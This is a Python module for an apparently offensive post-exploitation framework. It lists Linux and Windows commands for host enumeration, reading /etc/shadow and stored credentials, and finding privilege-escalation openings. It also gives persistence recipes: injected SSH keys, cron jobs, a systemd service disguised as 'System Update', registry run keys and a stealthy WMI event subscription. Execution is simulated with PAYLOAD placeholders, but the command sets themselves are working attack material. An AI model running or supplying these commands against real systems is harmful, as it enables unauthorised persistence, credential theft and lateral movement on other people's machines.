"""
Post-exploitation enumeration and persistence framework.

This module implements post-exploitation activities including system enumeration,
privilege escalation, persistence mechanisms, and lateral movement capabilities.
"""

import asyncio
import logging
import json
import base64
from datetime import datetime
from typing import Dict, List, Optional, Set, Any, Tuple, Union
import aiohttp

from recon.collectors import BaseCollector


logger = logging.getLogger(__name__)


class SystemEnumerator:
    """System enumeration for post-exploitation intelligence gathering."""
    
    def __init__(self):
        self.enumeration_commands = self._load_enumeration_commands()
        self.privilege_escalation_checks = self._load_privesc_checks()
        self.persistence_methods = self._load_persistence_methods()
    
    def _load_enumeration_commands(self) -> Dict[str, Dict[str, List[str]]]:
        """Load system enumeration commands by OS."""
        return {
            'linux': {
                'system_info': [
                    'uname -a',
                    'cat /etc/os-release',
                    'cat /proc/version',
                    'hostname',
                    'whoami',
                    'id',
                    'pwd'
                ],
                'network_info': [
                    'ifconfig -a',
                    'ip addr show',
                    'netstat -antup',
                    'ss -antup',
                    'route -n',
                    'arp -a',
                    'cat /etc/resolv.conf'
                ],
                'user_info': [
                    'cat /etc/passwd',
                    'cat /etc/group',
                    'w',
                    'who',
                    'last',
                    'cat /etc/sudoers',
                    'sudo -l'
                ],
                'process_info': [
                    'ps aux',
                    'ps -ef',
                    'top -n 1',
                    'pstree',
                    'systemctl list-units --type=service',
                    'service --status-all'
                ],
                'file_system': [
                    'ls -la /',
                    'ls -la /home',
                    'ls -la /var/www',
                    'find / -type f -perm -4000 2>/dev/null',
                    'find / -type f -perm -2000 2>/dev/null',
                    'find / -writable -type d 2>/dev/null',
                    'df -h',
                    'mount'
                ],
                'security_info': [
                    'cat /etc/shadow',
                    'cat /etc/ssh/sshd_config',
                    'iptables -L',
                    'cat /var/log/auth.log',
                    'cat /var/log/secure',
                    'crontab -l',
                    'cat /etc/crontab'
                ]
            },
            'windows': {
                'system_info': [
                    'systeminfo',
                    'hostname',
                    'whoami',
                    'whoami /priv',
                    'whoami /groups',
                    'echo %USERNAME%',
                    'echo %COMPUTERNAME%'
                ],
                'network_info': [
                    'ipconfig /all',
                    'netstat -ano',
                    'route print',
                    'arp -a',
                    'netsh wlan show profiles',
                    'netsh interface show interface'
                ],
                'user_info': [
                    'net user',
                    'net localgroup',
                    'net localgroup administrators',
                    'query user',
                    'qwinsta',
                    'cmdkey /list'
                ],
                'process_info': [
                    'tasklist /svc',
                    'wmic process list full',
                    'sc query',
                    'net start',
                    'wmic service list brief'
                ],
                'file_system': [
                    'dir C:\\',
                    'dir C:\\Users',
                    'dir C:\\inetpub\\wwwroot',
                    'icacls C:\\',
                    'wmic logicaldisk get size,freespace,caption'
                ],
                'security_info': [
                    'net accounts',
                    'net share',
                    'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'schtasks /query /fo LIST /v',
                    'netsh firewall show state',
                    'netsh advfirewall show allprofiles'
                ]
            }
        }
    
    def _load_privesc_checks(self) -> Dict[str, List[Dict[str, Any]]]:
        """Load privilege escalation checks."""
        return {
            'linux': [
                {
                    'name': 'SUID Binaries',
                    'command': 'find / -type f -perm -4000 2>/dev/null',
                    'description': 'Find SUID binaries that might be exploitable',
                    'risk': 'high'
                },
                {
                    'name': 'Sudo Privileges',
                    'command': 'sudo -l',
                    'description': 'Check sudo privileges for current user',
                    'risk': 'high'
                },
                {
                    'name': 'Writable /etc/passwd',
                    'command': 'ls -la /etc/passwd',
                    'description': 'Check if /etc/passwd is writable',
                    'risk': 'critical'
                },
                {
                    'name': 'Kernel Exploits',
                    'command': 'uname -a && cat /proc/version',
                    'description': 'Check kernel version for known exploits',
                    'risk': 'high'
                },
                {
                    'name': 'Cron Jobs',
                    'command': 'cat /etc/crontab && crontab -l',
                    'description': 'Check for exploitable cron jobs',
                    'risk': 'medium'
                },
                {
                    'name': 'World Writable Directories',
                    'command': 'find / -type d -perm -002 2>/dev/null',
                    'description': 'Find world-writable directories',
                    'risk': 'medium'
                }
            ],
            'windows': [
                {
                    'name': 'Unquoted Service Paths',
                    'command': 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """',
                    'description': 'Find services with unquoted paths',
                    'risk': 'high'
                },
                {
                    'name': 'AlwaysInstallElevated',
                    'command': 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated',
                    'description': 'Check for AlwaysInstallElevated policy',
                    'risk': 'high'
                },
                {
                    'name': 'Stored Credentials',
                    'command': 'cmdkey /list',
                    'description': 'Check for stored credentials',
                    'risk': 'medium'
                },
                {
                    'name': 'Registry Autologon',
                    'command': 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"',
                    'description': 'Check for autologon credentials in registry',
                    'risk': 'medium'
                },
                {
                    'name': 'Scheduled Tasks',
                    'command': 'schtasks /query /fo LIST /v',
                    'description': 'Check for exploitable scheduled tasks',
                    'risk': 'medium'
                }
            ]
        }
    
    def _load_persistence_methods(self) -> Dict[str, List[Dict[str, Any]]]:
        """Load persistence methods by OS."""
        return {
            'linux': [
                {
                    'name': 'SSH Key Persistence',
                    'commands': [
                        'mkdir -p ~/.ssh',
                        'echo "SSH_PUBLIC_KEY" >> ~/.ssh/authorized_keys',
                        'chmod 600 ~/.ssh/authorized_keys'
                    ],
                    'description': 'Add SSH public key for persistent access',
                    'stealth': 'medium',
                    'persistence': 'high'
                },
                {
                    'name': 'Cron Job Persistence',
                    'commands': [
                        'echo "* * * * * /bin/bash -c \'PAYLOAD\'" | crontab -'
                    ],
                    'description': 'Add cron job for periodic execution',
                    'stealth': 'low',
                    'persistence': 'high'
                },
                {
                    'name': 'Systemd Service',
                    'commands': [
                        'echo "[Unit]\\nDescription=System Update\\n[Service]\\nExecStart=PAYLOAD\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/update.service',
                        'systemctl enable update.service',
                        'systemctl start update.service'
                    ],
                    'description': 'Create systemd service for persistence',
                    'stealth': 'medium',
                    'persistence': 'high'
                },
                {
                    'name': 'Bashrc Persistence',
                    'commands': [
                        'echo "PAYLOAD" >> ~/.bashrc'
                    ],
                    'description': 'Add payload to bashrc for execution on login',
                    'stealth': 'medium',
                    'persistence': 'medium'
                }
            ],
            'windows': [
                {
                    'name': 'Registry Run Key',
                    'commands': [
                        'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "Update" /t REG_SZ /d "PAYLOAD"'
                    ],
                    'description': 'Add registry run key for startup persistence',
                    'stealth': 'low',
                    'persistence': 'high'
                },
                {
                    'name': 'Scheduled Task',
                    'commands': [
                        'schtasks /create /tn "System Update" /tr "PAYLOAD" /sc onlogon'
                    ],
                    'description': 'Create scheduled task for persistence',
                    'stealth': 'medium',
                    'persistence': 'high'
                },
                {
                    'name': 'WMI Event Subscription',
                    'commands': [
                        'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="BotFilter47", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfRawData_PerfOS_System\'"',
                        'wmic /NAMESPACE:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="PAYLOAD", CommandLineTemplate="PAYLOAD"'
                    ],
                    'description': 'Create WMI event subscription for stealth persistence',
                    'stealth': 'high',
                    'persistence': 'high'
                }
            ]
        }
    
    async def enumerate_system(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Perform comprehensive system enumeration."""
        
        enumeration_results = {
            'target': target_info.get('target', ''),
            'os_type': target_info.get('os_type', 'unknown'),
            'access_method': target_info.get('access_method', ''),
            'enumeration_data': {},
            'privilege_escalation_opportunities': [],
            'persistence_recommendations': [],
            'lateral_movement_targets': [],
            'timestamp': datetime.utcnow().isoformat()
        }
        
        os_type = target_info.get('os_type', 'linux').lower()
        
        if os_type not in self.enumeration_commands:
            os_type = 'linux'  # Default to Linux
        
        # Perform enumeration based on OS type
        enumeration_data = {}
        
        for category, commands in self.enumeration_commands[os_type].items():
            enumeration_data[category] = []
            
            for command in commands:
                # In a real implementation, this would execute the command
                # For safety, we'll simulate the enumeration
                result = await self._simulate_command_execution(command, os_type)
                enumeration_data[category].append({
                    'command': command,
                    'result': result,
                    'timestamp': datetime.utcnow().isoformat()
                })
        
        enumeration_results['enumeration_data'] = enumeration_data
        
        # Check for privilege escalation opportunities
        privesc_opportunities = await self._check_privilege_escalation(os_type, enumeration_data)
        enumeration_results['privilege_escalation_opportunities'] = privesc_opportunities
        
        # Generate persistence recommendations
        persistence_recommendations = self._generate_persistence_recommendations(os_type, target_info)
        enumeration_results['persistence_recommendations'] = persistence_recommendations
        
        # Identify lateral movement targets
        lateral_targets = self._identify_lateral_movement_targets(enumeration_data)
        enumeration_results['lateral_movement_targets'] = lateral_targets
        
        return enumeration_results
    
    async def _simulate_command_execution(self, command: str, os_type: str) -> Dict[str, Any]:
        """Simulate command execution for safety."""
        
        # This would normally execute the actual command
        # For safety and demonstration, we'll return simulated results
        
        simulated_results = {
            'linux': {
                'uname -a': 'Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux',
                'whoami': 'www-data',
                'id': 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
                'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
                'sudo -l': 'User www-data may run the following commands on target:\n    (ALL) NOPASSWD: /usr/bin/systemctl restart apache2',
                'find / -type f -perm -4000 2>/dev/null': '/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/gpasswd\n/bin/ping'
            },
            'windows': {
                'whoami': 'NT AUTHORITY\\IUSR',
                'whoami /priv': 'PRIVILEGES INFORMATION\nPrivilege Name                Description                    State\n=============================  =============================  ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled',
                'systeminfo': 'Host Name:                 TARGET\nOS Name:                   Microsoft Windows Server 2019\nOS Version:                10.0.17763 N/A Build 17763',
                'net user': 'User accounts for \\\\TARGET\nAdministrator            Guest                    DefaultAccount'
            }
        }
        
        result_text = simulated_results.get(os_type, {}).get(command, f'Simulated output for: {command}')
        
        return {
            'success': True,
            'output': result_text,
            'exit_code': 0,
            'execution_time': 0.1,
            'note': 'Simulated execution for safety'
        }
    
    async def _check_privilege_escalation(self, os_type: str, enumeration_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check for privilege escalation opportunities."""
        
        opportunities = []
        
        if os_type not in self.privilege_escalation_checks:
            return opportunities
        
        for check in self.privilege_escalation_checks[os_type]:
            # Simulate privilege escalation check
            opportunity = {
                'name': check['name'],
                'description': check['description'],
                'risk_level': check['risk'],
                'command': check['command'],
                'findings': [],
                'exploitable': False,
                'timestamp': datetime.utcnow().isoformat()
            }
            
            # Simulate findings based on check type
            if 'sudo' in check['name'].lower():
                opportunity['findings'] = ['User has sudo privileges for systemctl']
                opportunity['exploitable'] = True
            elif 'suid' in check['name'].lower():
                opportunity['findings'] = ['Found potentially exploitable SUID binaries']
                opportunity['exploitable'] = True
            
            opportunities.append(opportunity)
        
        return opportunities
    
    def _generate_persistence_recommendations(self, os_type: str, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate persistence method recommendations."""
        
        recommendations = []
        
        if os_type not in self.persistence_methods:
            return recommendations
        
        current_user = target_info.get('current_user', 'unknown')
        privileges = target_info.get('privileges', [])
        
        for method in self.persistence_methods[os_type]:
            recommendation = {
                'name': method['name'],
                'description': method['description'],
                'commands': method['commands'],
                'stealth_level': method['stealth'],
                'persistence_level': method['persistence'],
                'applicable': True,
                'requirements': [],
                'timestamp': datetime.utcnow().isoformat()
            }
            
            # Check if method is applicable based on current access
            if 'ssh' in method['name'].lower():
                recommendation['requirements'] = ['SSH access', 'Home directory write access']
            elif 'systemd' in method['name'].lower():
                recommendation['requirements'] = ['Root privileges', 'Systemd system']
                recommendation['applicable'] = 'root' in current_user.lower()
            elif 'registry' in method['name'].lower():
                recommendation['requirements'] = ['Registry write access']
            
            recommendations.append(recommendation)
        
        return recommendations
    
    def _identify_lateral_movement_targets(self, enumeration_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Identify potential lateral movement targets."""
        
        targets = []
        
        # Analyze network information for potential targets
        network_info = enumeration_data.get('network_info', [])
        
        for network_result in network_info:
            command = network_result.get('command', '')
            output = network_result.get('result', {}).get('output', '')
            
            if 'arp' in command or 'netstat' in command:
                # Simulate finding network targets
                targets.append({
                    'type': 'network_host',
                    'target': '192.168.1.10',
                    'method': 'network_scan',
                    'confidence': 'medium',
                    'services': ['SSH', 'HTTP'],
                    'timestamp': datetime.utcnow().isoformat()
                })
        
        # Analyze user information for credential reuse
        user_info = enumeration_data.get('user_info', [])
        
        for user_result in user_info:
            if 'passwd' in user_result.get('command', ''):
                targets.append({
                    'type': 'user_account',
                    'target': 'administrator',
                    'method': 'credential_reuse',
                    'confidence': 'low',
                    'notes': 'Potential credential reuse target',
                    'timestamp': datetime.utcnow().isoformat()
                })
        
        return targets


class PostExploitationFramework:
    """Main post-exploitation framework."""
    
    def __init__(self):
        self.system_enumerator = SystemEnumerator()
        self.active_sessions = {}
    
    async def execute_post_exploitation(self, session_info: Dict[str, Any]) -> Dict[str, Any]:
        """Execute comprehensive post-exploitation activities."""
        
        post_exploit_results = {
            'session_id': session_info.get('session_id', ''),
            'target': session_info.get('target', ''),
            'access_level': session_info.get('access_level', 'user'),
            'enumeration_results': {},
            'privilege_escalation_attempts': [],
            'persistence_established': [],
            'lateral_movement_opportunities': [],
            'data_collection': {},
            'timestamp': datetime.utcnow().isoformat()
        }
        
        # Perform system enumeration
        enumeration_results = await self.system_enumerator.enumerate_system(session_info)
        post_exploit_results['enumeration_results'] = enumeration_results
        
        # Attempt privilege escalation if not already root/admin
        if session_info.get('access_level', 'user') != 'root':
            privesc_attempts = await self._attempt_privilege_escalation(session_info, enumeration_results)
            post_exploit_results['privilege_escalation_attempts'] = privesc_attempts
        
        # Establish persistence
        persistence_results = await self._establish_persistence(session_info, enumeration_results)
        post_exploit_results['persistence_established'] = persistence_results
        
        # Identify lateral movement opportunities
        lateral_opportunities = enumeration_results.get('lateral_movement_targets', [])
        post_exploit_results['lateral_movement_opportunities'] = lateral_opportunities
        
        # Collect sensitive data
        data_collection = await self._collect_sensitive_data(session_info, enumeration_results)
        post_exploit_results['data_collection'] = data_collection
        
        return post_exploit_results
    
    async def _attempt_privilege_escalation(self, session_info: Dict[str, Any], 
                                          enumeration_results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Attempt privilege escalation based on enumeration results."""
        
        attempts = []
        
        privesc_opportunities = enumeration_results.get('privilege_escalation_opportunities', [])
        
        for opportunity in privesc_opportunities:
            if opportunity.get('exploitable', False):
                attempt = {
                    'method': opportunity['name'],
                    'description': opportunity['description'],
                    'command': opportunity['command'],
                    'attempted': True,
                    'success': False,  # Simulated for safety
                    'result': 'Simulated attempt - would execute privilege escalation',
                    'timestamp': datetime.utcnow().isoformat()
                }
                
                attempts.append(attempt)
        
        return attempts
    
    async def _establish_persistence(self, session_info: Dict[str, Any], 
                                   enumeration_results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Establish persistence mechanisms."""
        
        persistence_results = []
        
        recommendations = enumeration_results.get('persistence_recommendations', [])
        
        for recommendation in recommendations[:2]:  # Limit to 2 methods
            if recommendation.get('applicable', False):
                result = {
                    'method': recommendation['name'],
                    'description': recommendation['description'],
                    'commands': recommendation['commands'],
                    'stealth_level': recommendation['stealth_level'],
                    'implemented': False,  # Simulated for safety
                    'result': 'Simulated implementation - would establish persistence',
                    'timestamp': datetime.utcnow().isoformat()
                }
                
                persistence_results.append(result)
        
        return persistence_results
    
    async def _collect_sensitive_data(self, session_info: Dict[str, Any], 
                                    enumeration_results: Dict[str, Any]) -> Dict[str, Any]:
        """Collect sensitive data from the compromised system."""
        
        data_collection = {
            'credentials': [],
            'configuration_files': [],
            'database_access': [],
            'network_information': [],
            'user_data': [],
            'timestamp': datetime.utcnow().isoformat()
        }
        
        # Simulate data collection based on enumeration results
        enumeration_data = enumeration_results.get('enumeration_data', {})
        
        # Check for credential files
        if 'security_info' in enumeration_data:
            data_collection['credentials'].append({
                'type': 'password_hashes',
                'source': '/etc/shadow',
                'count': 5,
                'note': 'Simulated - would extract password hashes'
            })
        
        # Check for configuration files
        if 'file_system' in enumeration_data:
            data_collection['configuration_files'].append({
                'type': 'web_config',
                'source': '/var/www/html/config.php',
                'contains': 'Database credentials',
                'note': 'Simulated - would extract configuration'
            })
        
        # Network information
        if 'network_info' in enumeration_data:
            data_collection['network_information'].append({
                'type': 'network_topology',
                'source': 'Network enumeration',
                'targets_found': 3,
                'note': 'Simulated - would map network topology'
            })
        
        return data_collection


class PostExploitationCollector(BaseCollector):
    """Post-exploitation collector for comprehensive system analysis."""
    
    def __init__(self):
        super().__init__("post_exploitation")
        self.post_exploit_framework = PostExploitationFramework()
    
    async def collect(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Execute post-exploitation activities."""
        
        session_configs = kwargs.get('session_configs', [])
        
        if not session_configs:
            return []
        
        # Execute post-exploitation for each session
        for session_config in session_configs:
            try:
                # Set target if not specified
                if 'target' not in session_config:
                    session_config['target'] = target
                
                # Execute post-exploitation
                post_exploit_result = await self.post_exploit_framework.execute_post_exploitation(session_config)
                
                self.add_result({
                    'type': 'post_exploitation_result',
                    'target': target,
                    'post_exploitation': post_exploit_result
                })
            
            except Exception as e:
                logger.error(f"Failed to execute post-exploitation: {e}")
                continue
        
        return self.results


# Standalone usage
if __name__ == "__main__":
    async def test_post_exploitation():
        collector = PostExploitationCollector()
        
        test_sessions = [
            {
                'session_id': 'test_1',
                'os_type': 'linux',
                'access_level': 'user',
                'current_user': 'www-data',
                'access_method': 'web_shell'
            }
        ]
        
        results = await collector.collect(
            "192.168.1.100",
            session_configs=test_sessions
        )
        
        print(f"Post-exploitation completed with {len(results)} results")
        for result in results:
            print(f"- {result.get('type')}: {result}")
    
    asyncio.run(test_post_exploitation())
